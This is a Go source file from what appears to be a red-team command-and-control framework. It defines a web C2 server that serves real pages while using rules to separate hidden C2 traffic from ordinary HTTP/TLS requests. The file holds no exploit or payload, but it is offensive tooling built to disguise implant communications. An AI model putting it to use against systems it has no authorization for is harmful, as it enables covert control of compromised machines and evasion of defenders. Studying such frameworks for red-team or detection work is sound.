// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package wc2

import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"os"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Server is a C2 profile that mimics a standard web server and client setup.
// This struct inherits the http.Server struct and can be used to serve real
// files and pages.
//
// Use the Target Rules a URL mapping that can be used by clients to access the
// C2 functions.
type Server struct {
	Target Target

	ch      chan complete
	tls     *tls.Config
	dialer  *net.Dialer
	handler *http.ServeMux

	Client *http.Client
	rules  []Rule
	done   uint32
}
type directory string

// Close terminates this Web instance and signals all current listeners and
// clients to disconnect. This will close all connections related to this struct.
//
// This function does not block.
func (s *Server) Close() error {
	if atomic.LoadUint32(&s.done) == 0 {
		atomic.StoreUint32(&s.done, 1)
		close(s.ch)
	}
	return nil
}

// TargetAsRule will take the server 'Target' and create a matching ruleset using
// the 'Rule' function.
func (s *Server) TargetAsRule() {
	if s.Target.empty() {
		return
	}
	s.Rule(s.Target.Rule())
}

// Rule adds the specified rules to the Web instance to assist in determing real
// and C2 traffic.
func (s *Server) Rule(r ...Rule) {
	if len(r) == 0 {
		return
	}
	if s.rules == nil {
		s.rules = make([]Rule, 0, len(r))
	}
	s.rules = append(s.rules, r...)
}

// New creates a new Web C2 server instance. This can be passed to the Listen
// function of a controller to serve a Web Server that also acts as a C2 instance.
//
// This struct supports all the default Golang http.Server functions and can be
// used to serve real web pages. Rules must be defined using the 'Rule' function
// to allow the server to differentiate between C2 and real traffic.
func New(t time.Duration) *Server {
	return NewTLS(t, nil)
}

// Serve attempts to serve the specified filesystem path 'f' at the URL mapped
// path 'p'. This function will determine if the path represents a file or
// directory and will call 'ServeFile' or 'ServeDirectory' depending on the path
// result. This function will return an error if the filesystem path does not
// exist or is invalid.
func (s *Server) Serve(p, f string) error {
	i, err := os.Stat(f)
	if err != nil {
		return err
	}
	if i.IsDir() {
		s.handler.Handle(p, http.FileServer(http.Dir(f)))
		return nil
	}
	s.handler.Handle(p, http.FileServer(directory(f)))
	return nil
}

// ServeFile attempts to serve the specified filesystem path 'f' at the URL mapped
// path 'p'. This function is used to serve files and will return an error if the
// filesystem path does not exist or the path destination is not a file.
func (s *Server) ServeFile(p, f string) error {
	i, err := os.Stat(f)
	if err != nil {
		return err
	}
	if !i.IsDir() {
		s.handler.Handle(p, http.FileServer(directory(f)))
		return nil
	}
	return xerr.Sub("not a file", 0x35)
}

// Handle registers the handler for the given pattern. If a handler already exists
// for pattern, Handle panics.
func (s *Server) Handle(p string, h http.Handler) {
	s.handler.Handle(p, h)
}

// ServeDirectory attempts to serve the specified filesystem path 'f' at the URL
// mapped path 'p'. This function is used to serve directories and will return
// an error if the filesystem path does not exist or the path destination is not
// a directory.
func (s *Server) ServeDirectory(p, f string) error {
	i, err := os.Stat(f)
	if err != nil {
		return err
	}
	if i.IsDir() {
		s.handler.Handle(p, http.FileServer(http.Dir(f)))
		return nil
	}
	return xerr.Sub("not a directory", 0x36)
}

// NewTLS creates a new TLS wrapped Web C2 server instance. This can be passed
// to the Listen function of a Controller to serve a Web Server that also acts
// as a C2 instance. This struct supports all the default Golang http.Server
// functions and can be used to serve real web pages. Rules must be defined
// using the 'Rule' function to allow the server to differentiate between C2
// and real traffic.
func NewTLS(t time.Duration, c *tls.Config) *Server {
	w := &Server{
		ch:      make(chan complete, 1),
		tls:     c,
		dialer:  &net.Dialer{Timeout: t, KeepAlive: t, DualStack: true},
		handler: new(http.ServeMux),
	}
	w.Client = &http.Client{
		Timeout: t,
		Transport: &http.Transport{
			Proxy:                 device.Proxy,
			DialContext:           w.dialer.DialContext,
			MaxIdleConns:          256,
			IdleConnTimeout:       w.dialer.Timeout,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   w.dialer.Timeout,
			ExpectContinueTimeout: w.dialer.Timeout,
			ResponseHeaderTimeout: w.dialer.Timeout,
			ReadBufferSize:        1,
			WriteBufferSize:       1,
			DisableKeepAlives:     true,
		},
	}
	return w
}

// Connect creates a C2 client connector that uses the same properties of the
// Web struct parent.
func (s *Server) Connect(x context.Context, a string) (net.Conn, error) {
	return connect(x, &s.Target, s.Client, a)
}
func (d directory) Open(_ string) (http.File, error) {
	// 0 - READONLY
	return os.OpenFile(string(d), 0, 0)
}

// Listen returns a new C2 listener for this Web instance. This function creates
// a separate server, but still shares the handler for the base Web instance that
// it's created from.
func (s *Server) Listen(x context.Context, a string) (net.Listener, error) {
	if s.tls != nil && (len(s.tls.Certificates) == 0 || s.tls.GetCertificate == nil) {
		return nil, com.ErrInvalidTLSConfig
	}
	v, err := com.ListenConfig.Listen(x, com.NameTCP, a)
	if err != nil {
		return nil, err
	}
	l := &listener{
		p:     s,
		ch:    make(chan complete, 1),
		pch:   s.ch,
		new:   make(chan *conn, 128),
		ctx:   x,
		rules: make([]Rule, len(s.rules)),
		Server: &http.Server{
			Addr:              a,
			TLSConfig:         s.tls,
			ReadTimeout:       s.dialer.Timeout,
			IdleTimeout:       0,
			WriteTimeout:      s.dialer.Timeout,
			ReadHeaderTimeout: s.dialer.Timeout,
		},
	}
	l.Handler, l.BaseContext = l, l.context
	if copy(l.rules, s.rules); s.tls != nil {
		if len(s.tls.NextProtos) == 0 {
			s.tls.NextProtos = []string{"http/1.1"} // Prevent using http2 for websockets
		}
		go l.listen(tls.NewListener(v, s.tls))
	} else {
		go l.listen(v)
	}
	return l, nil
}

// HandleFunc registers the handler function for the given pattern.
func (s *Server) HandleFunc(p string, h func(http.ResponseWriter, *http.Request)) {
	s.handler.HandleFunc(p, h)
}
